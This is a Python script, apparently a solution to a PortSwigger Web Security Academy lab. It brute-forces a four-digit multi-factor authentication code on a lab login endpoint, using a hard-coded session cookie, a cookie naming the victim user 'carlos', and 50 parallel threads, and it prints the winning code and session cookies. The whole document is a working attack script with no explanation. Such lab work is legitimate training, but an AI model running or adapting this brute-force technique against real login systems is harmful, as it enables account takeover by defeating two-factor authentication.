import requests
import sys
from concurrent.futures import ThreadPoolExecutor

url = "https://0a9b003503973bbb8089cb58008800d4.web-security-academy.net/login2"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0",
    "Referer": url,
    "Content-Type": "application/x-www-form-urlencoded"
}

cookies = {
    "session": "l13NvDVWGpuRlD2rFYMmUNEEsvztqfNS",
    "verify": "carlos"
}

def brute_force(i):
    code = f"{i:04}"
    data = {"mfa-code": code}
    
    try:
        r = requests.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=False)
        if r.status_code == 302:
            print(f"\n[+] Found Code: {code}")
            print(f"[+] Cookies: {r.cookies.get_dict()}")
            sys.exit(0)
        else:
            sys.stdout.write(f"\rTesting: {code}")
            sys.stdout.flush()
    except:
        pass

if __name__ == "__main__":
    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(brute_force, range(10000))